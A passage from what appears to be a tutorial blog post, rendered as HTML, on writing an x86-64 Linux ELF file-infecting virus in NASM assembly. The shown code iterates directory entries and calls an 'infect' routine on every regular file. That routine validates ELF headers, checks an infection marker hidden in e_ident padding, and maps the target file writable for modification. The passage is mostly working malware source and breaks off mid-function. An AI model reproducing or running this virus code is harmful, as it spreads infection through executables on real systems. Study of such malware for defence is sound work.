&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readdir:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;    rbp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rbp, rsp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rsp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_CHDIR  &lt;span style=&#34;color:#75715e&#34;&gt;; Let&amp;#39;s change the directory to open file,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#75715e&#34;&gt;; string operations are painful in ASM so relative paths will do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, O_DIRECTORY &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; O_RDONLY
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     eax, SYS_OPEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp], eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     rdi, rdi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rdx, PROT_READ &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PROT_WRITE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r10, MAP_ANONYMOUS &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; MAP_PRIVATE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r8, r8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;dec&lt;/span&gt;     r8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r9, r9
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     al, SYS_MMAP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;                 &lt;span style=&#34;color:#75715e&#34;&gt;; We map a page for the getdents buffer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    al, al
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jnz&lt;/span&gt;     end_readdir
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;], rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loop_dir:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, DIRENT_MAX_SIZE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     al, SYS_GETDENTS64
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     eax, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jle&lt;/span&gt;     end_readdir
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;], eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r8, r8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loop_buf_dirent:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;], r8w
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r9, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;BYTE&lt;/span&gt; [r9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; d_type], DT_REG
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     next_dirent
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rdi, [r9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; d_name]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;    infect          &lt;span style=&#34;color:#75715e&#34;&gt;; We only infect regular files &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;next_dirent:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r9, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;movzx&lt;/span&gt;   r8, &lt;span style=&#34;color:#66d9ef&#34;&gt;WORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     r8w, [r9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; d_reclen]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     r8w, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jl&lt;/span&gt;      loop_buf_dirent
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jmp&lt;/span&gt;     loop_dir
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;end_readdir:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     eax, SYS_CLOSE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MUNMAP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;leave&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With the &lt;code&gt;readdir&lt;/code&gt; function, we will loop through all the &lt;code&gt;linux_dirent64&lt;/code&gt; structures present in each of the target directories. If the current structure describes a regular file, we will call the &lt;code&gt;infect&lt;/code&gt; function with its name as argument to try to infect it.&lt;/p&gt;
&lt;h3 id=&#34;preliminary-checks&#34;&gt;Preliminary checks&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;infect&lt;/code&gt; function will be the main function of our program. To make the code more clean, I&amp;rsquo;ve defined a structure called &lt;code&gt;Infection_struct&lt;/code&gt; in &lt;code&gt;defines.s&lt;/code&gt; that will allow me, by considering the stack frame as this structure to use its fields as local variable names.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;infect:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;    rbp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rbp, rsp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rsp, INFECTOR_STRUCT_SIZE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     esi, O_RDWR
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_OPEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     eax, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jl&lt;/span&gt;      quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd], eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_elfhdr]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, ELFHDR_SIZE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_READ
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rbx, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_elfhdr]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rax, [rbx &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_ident]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [rax], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; ELF_MAGIC
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     close_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; EI_CLASS], &lt;span style=&#34;color:#66d9ef&#34;&gt;BYTE&lt;/span&gt; ELFCLASS64
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     close_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; EI_DATA], &lt;span style=&#34;color:#66d9ef&#34;&gt;BYTE&lt;/span&gt; ELFDATA2LSB       &lt;span style=&#34;color:#75715e&#34;&gt;; Only ELF 64 bits are being taken into account&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     close_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; EI_PAD], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; INFECTION_MAGIC   &lt;span style=&#34;color:#75715e&#34;&gt;; We check them to avoid double infection&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;je&lt;/span&gt;      close_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_phnum]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    rdx, rdx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;je&lt;/span&gt;      close_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     ax, [rbx &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_type]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     ax, ET_EXEC
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;je&lt;/span&gt;      right_type_check
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     ax, ET_DYN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     close_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The first part of this function is just about parsing the ELF header to check for several things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The file is a valid ELF file&lt;/li&gt;
&lt;li&gt;It is either an executable file or a shared object file&lt;/li&gt;
&lt;li&gt;It has not been infected yet&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Since it is useless and memory-consuming to reinfect a file, we will prevent that to append. In the &lt;code&gt;e_ident&lt;/code&gt; field of the ELF header, there are some padding bytes that are unused and zero-filled. We will put an infection marker here to keep track of the already infected binaries.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;right_type_check:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     rsi, rsi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, SEEK_END
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_LSEEK
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize], rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     rdi, rdi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, PROT_READ &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PROT_WRITE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r10, MAP_SHARED
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r8d, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r9, r9
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MMAP
